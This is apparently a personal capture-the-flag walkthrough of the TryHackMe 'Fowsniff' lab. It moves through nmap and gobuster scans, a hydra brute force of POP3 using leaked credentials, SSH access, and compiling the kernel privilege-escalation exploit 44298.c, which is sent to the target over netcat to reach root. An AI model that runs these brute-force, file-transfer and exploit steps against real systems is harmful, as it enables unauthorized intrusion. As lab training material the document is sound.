nmap -sV -sC -o nmap 10.10.175.205

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-10 00:55 EDT
Nmap scan report for 10.10.175.205
Host is up (0.34s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) TOP USER PIPELINING RESP-CODES AUTH-RESP-CODE UIDL CAPA
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: AUTH=PLAINA0001 ENABLE IMAP4rev1 listed OK LITERAL+ have post-login more LOGIN-REFERRALS ID Pre-login IDLE SASL-IR capabilities
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



gobuster dir -e -u http://10.10.175.205/ -w /usr/share/wordlists/dirb/common.txt

http://10.10.175.205/.htaccess (Status: 403)
http://10.10.175.205/.hta (Status: 403)
http://10.10.175.205/.htpasswd (Status: 403)
http://10.10.175.205/assets (Status: 301)
http://10.10.175.205/images (Status: 301)
http://10.10.175.205/index.html (Status: 200)
http://10.10.175.205/robots.txt (Status: 200)
http://10.10.175.205/server-status (Status: 403)

no interesting stuff from the live addresses.

going to the twitter page of the company, we get directed pastebin where all credentials are dumped
https://twitter.com/fowsniffcorp?lang=en


"Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!"

lets prep for a hydra bruteforce

run a simple sed command to extract the hashed passwords (everything after the ':') into a file named hashes.txt:
sed -n 's/.*://p' fowsniff.txt > hashes.txt

decrypt it and store it in password.txt

getting the users out to a seperate txt file
awk -F'@' '{print $1}' FowsniffCorp.txt > usersl.txt

alright let hydra it

kali@kali:~/oscptraining/tryhackme/Fowsniff$ hydra -L usersl.txt -P password -f 10.10.175.205 pop3
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-10 01:54:49
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 72 login tries (l:9/p:8), ~5 tries per task
[DATA] attacking pop3://10.10.175.205:110/
[110][pop3] host: 10.10.175.205   login: seina   password: scoobydoo2
[STATUS] attack finished for 10.10.175.205 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-10 01:55:10

gaining access
kali@kali:~/oscptraining/tryhackme/Fowsniff$ nc 10.10.175.205 110
+OK Welcome to the Fowsniff Corporate Mail Server!
seina
-ERR Unknown command.
exit
-ERR Unknown command.
user seina
+OK
pass scoobydoo2
+OK Logged in.

looking thru the mail
list - to list
retr - retrieving the results
kali@kali:~$ ssh baksteen@10.10.175.205 -p22

baksteen@fowsniff:~$ uname -a
Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

searchsploit reveals this result
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                | linux/local/44298.c

kali@kali:~$ searchsploit 44298 -p
  Exploit: Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/44298
     Path: /usr/share/exploitdb/exploits/linux/local/44298.c
File Type: C source, ASCII text, with CRLF line terminators


kali@kali:~$ cp /usr/share/exploitdb/exploits/linux/local/44298.c /home/kali/oscptraining/tryhackme/Fowsniff

compile the exploit
gcc 44298.c

on my kali
kali@kali:~/oscptraining/tryhackme/Fowsniff$ nc -nlvp 4444 < a.out

on the victim 
nc 10.8.102.117 4444 > 44298

once the file is in we can check for the permission
baksteen@fowsniff:~$ ls -l 44298
-rw-r--r-- 1 baksteen users 17880 Oct 10 02:18 44298

lets give it execute permisison
baksteen@fowsniff:~$ chmod +x 44298
baksteen@fowsniff:~$ ls -l 44298
-rwxr-xr-x 1 baksteen users 17880 Oct 10 02:18 44298

./44298 to run the exploit and we root it!
10102020 1426hr

   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.












